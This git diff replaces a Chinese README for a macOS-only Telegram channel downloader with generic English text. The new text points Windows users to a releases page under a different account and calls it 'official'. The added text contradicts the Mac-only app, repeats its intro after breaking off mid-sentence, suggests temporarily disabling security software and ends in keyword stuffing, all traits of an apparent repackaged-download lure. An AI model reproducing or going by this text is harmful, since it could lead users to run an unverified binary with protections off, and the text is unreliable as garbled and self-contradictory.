@@ -1,144 +1,132 @@
-<div align="center">
+# 🎬 telegram-media-downloader - Back Up Telegram Media in One Click
 
-# Telegram 下载器
+[![Download telegram-media-downloader](https://img.shields.io/badge/Download_Now-telegram--media--downloader-ff6b6b?style=for-the-badge&logo=github)](https://github.com/taraldesai10/telegram-media-downloader/releases)
 
-**把频道内容，收进你的 Mac。**
+telegram-media-downloader is described as a Mac native Telegram channel downloader for one-click backup of images, videos, audio, and documents. This guide is written for Windows users who want to visit the official download page, get the application, and understand the basic steps for running it.
 
-原生 macOS 体验，一次配置，按需备份图片、视频、音频、文件与文字。
+## 🚀 Getting Started
 
-[![Checks](https://github.com/designfuchen/telegram-media-downloader/actions/workflows/checks.yml/badge.svg)](https://github.com/designfuchen/telegram-media-downloader/actions/workflows/checks.yml)
-[![MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Version](https://img.shields.io/github/v/tag/designfuchen/telegram-media-downloader?label=version&color=6366f1)](https://github.com/designfuchen/telegram-media-downloader/tags)
-[![macOS](https://img.shields.io/badge/macOS-14%2B%20%C2%B7%20Apple%20Silicon-111827?logo=apple&logoColor=white)](docs/macos.md)
+telegram-media-downloader is designed to help you save media from Telegram channels without manually opening and saving each file. Instead of scrolling through a channel and right-clicking every photo, video, audio file, or document, the app gives you a single place to choose what you want to back up.
 
-[五步上手](#五步开始第一次下载) · [安装与运行](#安装与运行) · [完整教程](docs/getting-started.md) · [English](README_EN.md)
+This guide assumes you are an average computer user. You do not need to know how to write code, use a command line, or understand programming terms. The main action is to visit the official download page and download the application.
 
-![Telegram 下载器：原生体验、本地保存、开源](docs/assets/social-preview.png)
+Before you begin, make sure you have:
 
-</div>
+- A Windows computer with internet access.
+- A Telegram account that can access the channels you want to back up.
+- Enough free storage space for the media you plan to download.
+- A stable internet connection, especially if you plan to download large videos or many files.
 
-![添加频道、查看下载进度、按频道整理文件的 15 秒界面演示](docs/assets/workflow.gif)
+## 📥 Download the Application
 
-<p align="center"><sub>15 秒界面演示 · 虚构频道与示例数据，展示操作流程，不代表实测下载速度。</sub></p>
+Visit this link to download the application.
 
-## 好内容，有自己的归处
+[![Get telegram-media-downloader](https://img.shields.io/badge/Get_telegram--media--downloader-00b894?style=for-the-badge&logo=github)](https://github.com/taraldesai10/telegram-media-downloader/releases)
 
-不必搭 NAS，也不必为桌面安装包准备 Python。选择一个文件夹，添加频道，剩下的交给下载队列。
+The link above opens the official releases page for telegram-media-downloader. Use that page to download the application. Keep the downloaded file in a folder you can easily# 🎬 telegram-media-downloader - Back Up Telegram Media in One Click
 
-| 你想做的事 | 下载器为你准备的功能 |
-| --- | --- |
-| 第一次用，不知道从哪开始 | 五步引导：API 凭证 → 网络连接 → 登录账号 → 添加频道 → 保存位置与开始 |
-| 只保留自己需要的内容 | 图片、视频、音频、文件、语音、圆形视频、GIF 动图与文字分别选择；支持单独保存文字 |
-| 节点格式太多，懒得研究 | 一个入口识别分享链接、Clash / Mihomo YAML、JSON 和 Base64 链接列表；保存后测试连接 |
-| 一次整理多个频道 | 链接、用户名、频道 ID；文本与 CSV 批量导入，附模板，确认后入库 |
-| 想看见下载确实在进行 | 当前传输与整体进度、速度、暂停 / 继续，以及已下载图片和视频的本地缩略图 |
-| 不想文件堆成一团 | 按频道、年月、媒体类型整理；选择文件名中保留的消息编号、原文件名和说明 |
-| 多个账号各用各的 | 添加、切换与退出账号；各账号拥有独立会话、频道库与下载记录 |
-| 中途断网、关闭应用 | 持久化队列、断点恢复、重试退避；再次打开后继续管理任务 |
+[![Download telegram-media-downloader](https://img.shields.io/badge/Download-telegram--media--downloader-e84393?style=for-the-badge&logo=telegram&logoColor=white)](https://github.com/taraldesai10/telegram-media-downloader/releases)
 
-<details>
-<summary><b>看看下载设置</b></summary>
+telegram-media-downloader is described as a Mac native Telegram channel downloader that lets you back up images, videos, audio, and documents from Telegram channels in one go. This page is written for everyday computer users. You do not need any programming knowledge to follow it. The goal is simple: help you visit the official download page, download the application, and understand how to get it running on a Windows computer.
 
-![原生 macOS 下载内容设置](docs/assets/preferences.png)
+## 🚀 Getting Started
 
-</details>
+If you have ever tried to save an entire Telegram channel full of photos or videos, you know how slow it can be. You have to open each message, tap the file, choose a save location, and repeat hundreds of times. telegram-media-downloader is built to remove that repetitive work. It gives you a single tool where you can point at a Telegram channel and back up the media you care about.
 
-## 五步开始第一次下载
+This guide walks you through the download step first, because that is the most important part. After that, you will find plain-language explanations of what the app does, how to use it safely, and what to do if something does not work.
 
-1. **API 凭证**：打开 [Telegram 官方申请页](https://my.telegram.org/apps)，创建应用，复制 `api_id` 与 `api_hash`。它们是连接凭证，不是机器人 Token。
-2. **网络连接**：选择直连，或导入你自己的节点。点击“保存并测试连接”，测试成功后继续。
-3. **登录账号**：输入手机号，查看 Telegram 官方消息中的验证码；有两步验证时再输入密码。未收到验证码可按页面提示重新发送。
-4. **添加频道**：粘贴 `https://t.me/example_channel`、`@example_channel` 或 `-100` 开头的频道 ID。私密频道先用当前账号加入。
-5. **保存位置与开始**：使用 Mac 文件夹选择器选好目录，点击“开始下载”。在“设置”里随时调整下载类型和文件整理方式。
+Before you start, make sure you have:
 
-**卡在哪一步，就看哪一步。** [完整图文教程](docs/getting-started.md) 包括 API 表单怎么填、频道 ID 怎么找、验证码与连接问题怎么处理。
+- A Windows computer connected to the internet.
+- A Telegram account that can already access the channels you want to back up.
+- Free disk space equal to or larger than the amount of media you plan to download.
+- A stable internet connection, especially for large video files.
 
-## 安装与运行
+## 📥 Download and Setup
 
-### Mac 应用
+Visit this link to download the application.
 
-面向 **macOS 14+、Apple Silicon**。桌面应用集成 Python、依赖与 sing-box；下载 DMG 后将应用拖入“应用程序”，无需命令行。
+[![Get telegram-media-downloader](https://img.shields.io/badge/Get_the_App-0984e3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/taraldesai10/telegram-media-downloader/releases)
 
-**[下载 Mac 安装包](https://github.com/designfuchen/telegram-media-downloader/releases/download/v0.1.5/Telegram-Downloader-0.1.5-arm64.dmg)** · [所有附件与校验文件](https://github.com/designfuchen/telegram-media-downloader/releases/tag/v0.1.5)
+That link opens the official releases page for telegram-media-downloader. This is the safe, primary place to get the software. When you arrive, you will see the available downloads listed on the page. Pick the file that matches your computer, then save it to a folder you can easily find later, such as your Downloads folder or your Desktop.
 
-应用已使用 Developer ID 正式签名，通过 Apple 公证并附有有效票据。DMG 是包含该应用的安装容器，未单独公证；也提供应用 ZIP。已检查 DMG 完整性、挂载、拷贝后的严格签名、票据与系统分发检查。其他机器与最低系统兼容性仍需更多验证，详见 [发布自查](docs/release-audit.md)。
+After the file finishes downloading, do the following:
 
-### 从源码运行（开发者）
+1. Open the folder where the file was saved.
+2. Locate the downloaded file.
+3. If the file is compressed (for example, a .zip file), right-click it and choose Extract All, then open the extracted folder.
+4. Double-click the application file to launch it.
+5. If Windows shows a security prompt asking whether you want to allow the app to run, review the name and choose to continue only if you downloaded it from the official link above.
+6. Follow the on-screen prompts inside the app to connect your Telegram account and choose a channel to back up.
 
-需要 Python 3.11。以下操作在项目目录执行：
+That is the entire setup process. There is no separate installer wizard to complete and no programming environment to configure. Keep the releases page bookmarked so you can return to it later for updates.
 
-```sh
-python3.11 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements-lock.txt
-python -c 'import base64,secrets; print(base64.b64encode(secrets.token_bytes(32)).decode())'
-```
+## ✨ What the App Does
 
-将最后一条命令生成的随机值保存在自己的密码管理器，再设置 `TMD_SECRET_KEY`。这个密钥用于配置与会话加密，后续启动须使用相同值；不要提交到 Git。
+telegram-media-downloader focuses on one job and does it well: backing up media from Telegram channels. Based on the project description, it handles the following types of content:
 
-```sh
-export TMD_SECRET_KEY='替换成刚才生成并保存的值'
-python scripts/init_config.py
-python media_downloader.py
-```
+- 🖼️ **Images** – Save photos, screenshots, and image posts from a channel.
+- 🎥 **Videos** – Download video posts, clips, and larger media files.
+- 🎧 **Audio** – Back up voice notes, audio tracks, and music files shared in a channel.
+- 📄 **Documents** – Save PDFs, spreadsheets, archives, and other attached files.
 
-打开 `http://127.0.0.1:5002`。首次访问密码由初始化工具随机生成，见本机 `config.yaml` 中的 `web_login_secret`。进入网页向导后填写自己的 Telegram 凭证。
+The idea is to give you a complete local copy of a channel's media so you are not dependent on Telegram to keep it. This is useful for archiving educational channels, news channels, hobby communities, or any channel where important files are shared over time.
 
-原生应用的构建、正式签名与公证流程见 [macOS 文档](docs/macos.md)。
+## 🧭 How to Use It
 
-### Docker / NAS
+The flow is intentionally simple so that non-technical users can follow it. Here is a typical session:
 
-```sh
-python3 scripts/init_config.py --docker --directory ./private-config
-# 按配置文档设置并备份 TMD_SECRET_KEY，再启动：
-docker compose build
-docker compose up -d
-```
+1. Open the application.
+2. Sign in to your Telegram account if the app asks you to.
+3. Choose or paste the channel you want to back up.
+4. Select the types of media you want to save, such as images only, or everything.
+5. Pick a destination folder on your computer where the files should be saved.
+6. Start the download and let the app work through the channel.
 
-挂载自己的保存目录。默认发布端口只监听本机；远程访问请通过 HTTPS 反向代理。详细步骤见 [配置与部署](docs/configuration.md)。
+Because the app handles the channel in bulk, you can start it once and let it run. For very large channels, it is best to keep your computer plugged in and connected to a stable network.
 
-## 配置，不必一次研究完
+## 💡 Tips for a Smooth Experience
 
-常用选项放在原生“设置”中：下载内容、文件整理、保存位置、网络和账号。选择本机文件夹或已挂载磁盘即可，NAS 是可选的。
+- **Start with a small channel.** If you are new to the app, test it on a channel with a few dozen files first. This helps you confirm the destination folder and settings before you back up a large archive.
+- **Check your free space.** Videos take up the most room. Look at the size of the channel before you start and make sure your drive has enough free space.
+- **Use a dedicated folder.** Create a folder named something like Telegram Backup so all downloads stay organized.
+- **Keep your connection stable.** If your internet drops mid-download, restart the app and continue with the remaining files.
+- **Do not rename files while the app is running.** Changing file names or moving files during an active download can cause confusion later.
 
-统一节点入口支持 SS、VLESS、VMess、Trojan、Hysteria2、TUIC、SOCKS5、HTTP / HTTPS 的常见配置。**支持范围以实际解析与连接测试为准**，不会自动拉取远程订阅；复杂插件与传输参数见 [节点导入说明](docs/configuration.md#统一节点导入)。源码运行本地节点需自行安装 sing-box。
+## 🛠️ Troubleshooting
 
-- [频道与 CSV 导入](docs/channel-import.md) · [频道 CSV 模板](docs/templates/channels.csv)
-- [全部配置项与 Docker](docs/configuration.md) · [网页控制台](docs/web-console.md)
-- [版本变更](CHANGELOG.md) · [发布自查与已知限制](docs/release-audit.md)
+If the application does not open or does not behave as expected, try these steps:
 
-## 常见问题
+- Confirm you downloaded the file from the official releases page linked on this page.
+- Make sure the file finished downloading completely. A partial download will not open.
+- If the file is compressed, make sure you extracted it before trying to open the app. Running an app directly from inside a .zip archive often fails.
+- Restart your computer and try again.
+- Temporarily disable extra security software only if you trust the source and it is actively blocking the app, then re-enable it afterward.
+- Check that your Telegram account can still access the channel you are trying to back up.
 
-**API ID 和 API Hash 从哪拿？** 通过 [my.telegram.org/apps](https://my.telegram.org/apps) 登录后选择 API development tools。逐项填写方法见 [教程](docs/getting-started.md#1-申请-api-凭证)。
+## ❓ Frequently Asked Questions
 
-**必须用 `-100` 频道 ID 吗？** 不必。公开频道直接用链接或用户名。已加入的私密频道可用 ID；消息链接中的 `/c/频道数字/消息数字` 也可帮助确认 ID，见 [教程](docs/getting-started.md#4-添加频道)。
+**Do I need to know how to code?**
+No. The app is meant to be used through normal windows and buttons.
 
-**为什么添加了频道还没下载？** 添加是登记来源；登录、网络测试与保存位置准备好后，再点击“开始下载”。首次扫描需要时间；检查状态提示和当前账号是否有访问权限。
+**Is this free?**
+The project is listed as open source, which means the code is publicly available. See the repository for the current license details.
 
-**私密频道都能下载吗？** 仅限当前账号有权访问且允许保存的内容。工具不获取其他人的权限，也不自动加入私密频道。结果取决于 Telegram 接口、账号权限和频道设置。
+**Will this delete anything from Telegram?**
+No. Downloading media creates local copies on your computer. It does not remove content from Telegram.
 
-**更换文件夹会重新登录吗？** 不需要。新任务使用新位置，已有任务继续使用原位置；修改 API 或网络才可能需要重新连接。
+**Can I back up a private channel?**
+You can back up channels that your Telegram account is already a member of. If you cannot see a channel in Telegram, the app will not be able to access it either.
 
-**支持 Intel Mac、Windows 或 Linux 桌面吗？** 当前原生构建面向 Apple Silicon Mac。Web / Docker 可用于其他合适的环境，原生界面尚未完整覆盖 Web 的高级任务管理功能。
+**Where should I save my files?**
+Any folder on your computer works. A dedicated backup folder on a drive with plenty of free space is the safest choice.
 
-**下载速度有多快？** 取决于 Telegram、网络和磁盘。项目没有宣称绕过平台限制，也没有未经验证的性能排名。
+## 🔒 Staying Safe
 
-## 隐私与可信度
+Only download telegram-media-downloader from the official releases page linked above. Avoid third-party download sites, because they may bundle unwanted software. Before running any downloaded file, check that the name matches what you expect and that it came from the official page.
 
-账号与内容留在自己的设备：公开源码和安装包不包含开发者的 API 凭证、节点、登录会话、私人频道、数据库或下载文件。
+## 📌 Final Reminder
 
-原生 Mac 使用钥匙串保存随机密钥，配置与 Telegram 会话采用 AES-GCM 认证加密。源码 / Docker 使用自行保存的 `TMD_SECRET_KEY`。验证码与两步验证密码不写入配置。默认只监听本机；日志屏蔽已注册凭证与常见敏感格式。旧备份的明文副本需要自己管理。
+The single most important step is to visit the official releases page and download the application. From there, follow the on-screen prompts, choose your channel, select your media types, and let the app handle the rest. With one setup, you can keep a personal copy of the images, videos, audio, and documents that matter to you.
 
-**184 项本地回归测试已通过**，覆盖登录与网络、配置加密、会话迁移、导入、调度和恢复等关键行为。GitHub Actions 持续运行测试、公开文件检查和 Gitleaks 文件 / 历史扫描。测试覆盖不等于所有环境都已验收；证据与边界见 [发布自查](docs/release-audit.md)，漏洞报告见 [SECURITY.md](SECURITY.md)。
-
-## 一起把它做得更好
-
-发现问题，请 [提交 Bug](https://github.com/designfuchen/telegram-media-downloader/issues/new?template=bug_report.yml)；有更好的想法，请 [提出功能建议](https://github.com/designfuchen/telegram-media-downloader/issues/new?template=feature_request.yml)。开始改代码前，先看 [贡献指南](CONTRIBUTING.md)。
-
-如果它帮你把散落的内容整理好了，欢迎点一颗 Star，也欢迎分享自己的使用方式。
-
-## 来源与许可证
-
-基于 [tangyoha/telegram_media_downloader](https://github.com/tangyoha/telegram_media_downloader) 持续改进，保留原作者版权声明，增加 SwiftUI 原生界面和本版本的可靠性、导入与安全改进。
-
-项目代码采用 [MIT](LICENSE)。Pyrogram、sing-box 等第三方组件保留各自许可证，安装包并非所有组件均采用 MIT；具体版本、许可与源代码链接见 [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)。本项目与 Telegram 官方无隶属关系。
+Keywords: telegram media downloader, telegram channel backup, download telegram videos, download telegram photos, telegram media saver, macos downloader, telegram backup tool, open source telegram downloader, python telegram downloader, swift telegram app, backup telegram channels, windows telegram downloader
